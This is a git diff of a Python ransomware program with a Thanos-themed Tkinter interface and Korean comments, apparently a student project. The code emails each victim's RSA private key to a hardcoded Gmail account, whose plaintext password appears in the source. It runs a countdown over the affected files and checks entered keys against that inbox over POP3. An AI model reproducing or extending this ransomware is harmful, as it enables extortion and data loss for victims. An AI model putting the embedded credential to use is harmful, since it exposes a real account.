@@ -11,6 +11,7 @@ from time import sleep
 import smtplib
 import uuid
 import poplib
+import email
 from email.mime.text import MIMEText
 
 import tkinter
@@ -258,18 +259,12 @@ class MyTk:
         self.parent and self.parent.checkPassword(self.pw)
 
         self.pwbutton.config(state='normal')
+        self.pwbutton['state'] = 'normal'
         self.l_input.config(text=" It's the wrong key.")
 
-    def imageChange(self):
-        self.l_thanos.destroy()
-        self.l_thanos = AnimatedGIF(self.window, "../ui/thanos1.gif")
-        self.l_thanos.pack()
-        sleep(2)
-        self.l_thanos.destroy()
-        self.l_thanos = tkinter.Label(self.window, image=self.thanos)
-        self.l_thanos.pack()
-
     def finalGui(self):
+        print("디버깅1")
+        '''
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
@@ -278,11 +273,22 @@ class MyTk:
 
         self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
                            font='Helvetica 24 bold')
+        print("디버깅2")
+        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
+        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
+        self.l_final.pack()
+'''
+        self.l_timer.destroy()
+        self.l_input.destroy()
+        self.password.destroy()
+        self.pwbutton.destroy()
+        self.l_thanos.destroy()
+
+        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
 
         self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
-
         sleep(5)
         self.window.destroy()
 
@@ -328,7 +334,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 10, antdd_filelist)
+    clock(gui, 300, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -401,6 +407,7 @@ class RealMain:
         smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!
 
         msg = MIMEText(self.private_key.decode())  # RSA개인키 를 메세지로 전송함
+
         msg['Subject'] = str(self.UUID)  # 사용자의 Mac 주소를 제목으로 전송
         msg['To'] = 'secureantdd@gmail.com'
         smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
@@ -433,17 +440,20 @@ class RealMain:
         # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
         for i in range(len(server.list()[1])):
             msg = server.retr(i + 1)[1]
-            text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
-            idx = text.find('Subject:')
-            text = text[idx + 9:]
-            uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
-            key = text[42:]  # 메일에 들어있는 해당 주소의 private key
+            #text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
+            #idx = text.find('Subject:')
+            #text = text[idx + 9:]
+            #uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
+            #key = text[42:]  # 메일에 들어있는 해당 주소의 private key
+            uuid = msg[12].decode()[msg[12].decode().find(':') + 2:]
+            key = b'\n'.join(msg[15:]).decode()
 
             # 만약 같은 주소의 사용자에게 온 메일이 있다면
             if uuid == str(self.UUID):
-
+                print("들어옴1")
                 # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip() == gui_input.strip():
+                    print("들어옴2")
                     # 해당 메일 삭제
                     server.dele(i + 1)
                     server.quit()
@@ -457,5 +467,8 @@ class RealMain:
 
 
 if __name__ == "__main__":
+    for i in range(5):
+        with open("test" + str(i) + '.txt', 'wb') as testfile:
+            testfile.write('테스트입니다'.encode())
     r = RealMain()
     r.run()
